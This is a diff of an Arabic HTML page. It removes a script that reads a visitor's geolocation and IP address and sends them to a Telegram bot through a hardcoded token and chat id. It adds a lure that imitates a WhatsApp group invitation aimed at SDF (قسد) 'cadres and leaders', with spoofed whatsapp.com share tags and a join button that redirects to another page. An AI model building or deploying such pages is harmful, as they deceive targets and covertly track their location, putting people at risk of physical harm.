@@ -1,82 +1,135 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title> hello pro </title>
-  <script>
-    const botToken = "7479937324:AAF2xQMakcnYT2z_hjuhbL_M8muZOg-dI0s";
-    const chatId = "7188733937";
+  <!-- الإعدادات الأساسية -->
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        alert("المتصفح لا يدعم تحديد الموقع");
+<!-- معلومات المشاركة عند مشاركة الرابط (Open Graph) -->
+<meta property="og:title" content="مجموعة واتساب -كوادر قسد" />
+<meta property="og:description" content="انضم الآن إلى مجموعة كوادر و قيادين في قوات قسد." />
+<meta property="og:image" content="https://ronahi.tv/ar/wp-content/uploads/2023/01/%D9%82%D8%B3%D8%AF-3.jpg" />
+<meta property="og:url" content="https://whatsapp.com/" />
+<meta property="og:type" content="whatsapp" />
+
+<!-- دعم المشاركة على تويتر -->
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="مجموعة واتساب - قوات قسد" />
+<meta property="og:description" content="انضم الآن إلى مجموعة كوادر و قيادين في قوات قسد." />
+<meta name="twitter:image" content="https://ronahi.tv/ar/wp-content/uploads/2023/01/%D9%82%D8%B3%D8%AF-3.jpg" />
+
+
+  <title> كروب واتساب  </title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #075e54; /* خلفية خضراء */
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #fff;
+    }
+
+    .whatsapp-ui {
+      background-color: #ffffff;
+      border-radius: 10px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+      color: #333;
+    }
+
+    .whatsapp-logo {
+      width: 150px;
+      margin-bottom: 10px;
+    }
+
+    h2 {
+      color: #075e54;
+      margin: 10px 0 20px;
+      font-size: 24px;
+    }
+
+    p {
+      color: #555;
+      margin-bottom: 20px;
+      font-size: 16px;
+    }
+
+    button {
+      background-color: #25D366;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: 0.3s;
+      width: 100%;
+      max-width: 300px;
+    }
+
+    button:hover {
+      background-color: #1ebd5a;
+    }
+
+    #location {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #333;
+      background-color: #dcf8c6;
+      padding: 10px;
+      border-radius: 8px;
+    }
+
+    @media screen and (max-width: 600px) {
+      .whatsapp-ui {
+        padding: 15px;
+      }
+      
+      h2 {
+        font-size: 22px;
+      }
+
+      p {
+        font-size: 14px;
+      }
+
+      button {
+        padding: 12px 20px;
+        font-size: 14px;
       }
     }
-
-    function showPosition(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-
-      document.getElementById("location").innerHTML =
-        "الخط العرض: " + lat + "<br>الخط الطول: " + lon;
-
-      fetch("https://api.ipify.org?format=json")
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;
-
-          const message = `📍 موقع جديد:
-خط العرض: ${lat}
-خط الطول: ${lon}
-🌐 IP: ${ip}`;
-
-          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-          const payload = {
-            chat_id: chatId,
-            text: message
-          };
-
-          fetch(url, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
-          }).then(() => {
-            console.log("✅ تم الإرسال إلى تليجرام");
-          }).catch(err => {
-            console.error("❌ فشل الإرسال إلى تليجرام", err);
-          });
-
-        }).catch(err => {
-          console.error("❌ لم يتم الحصول على IP", err);
-        });
-    }
-
-    function showError(error) {
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          alert("❌ رفضت الوصول إلى الموقع.");
-          break;
-        case error.POSITION_UNAVAILABLE:
-          alert("❌ تعذر الحصول على الموقع.");
-          break;
-        case error.TIMEOUT:
-          alert("⏱️ انتهت مهلة طلب الموقع.");
-          break;
-        case error.UNKNOWN_ERROR:
-          alert("❓ حدث خطأ غير معروف.");
-          break;
-      }
-    }
-  </script>
+  </style>
+ 
 </head>
 <body>
-  <h2>اضغط الزر لتحديد موقعك الجغرافي:</h2>
-  <button onclick="getLocation()">📍 تحديد الموقع</button>
-  <p id="location" style="margin-top: 20px;"></p>
+  <div class="whatsapp-ui">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="whatsapp-logo" alt="WhatsApp Logo">
+    <h2>  الدعوة للانضمام إلى مجموعة واتساب  </h2>
+    <p>    القيادة العامة للكوادر  </p>
+    <p>  عدد أعضاء الكروب 20 </p>
+    <button onclick="requestAccess()">  الانضمام الى الدردشة </button>
+    <div id="location"></div>
+  </div>
+
+
+
+
+
+  <script>
+    function requestAccess(){
+
+        window.location.href = "whatsapp.html"
+
+    }
+    
+ 
+  </script>
 </body>
 </html>
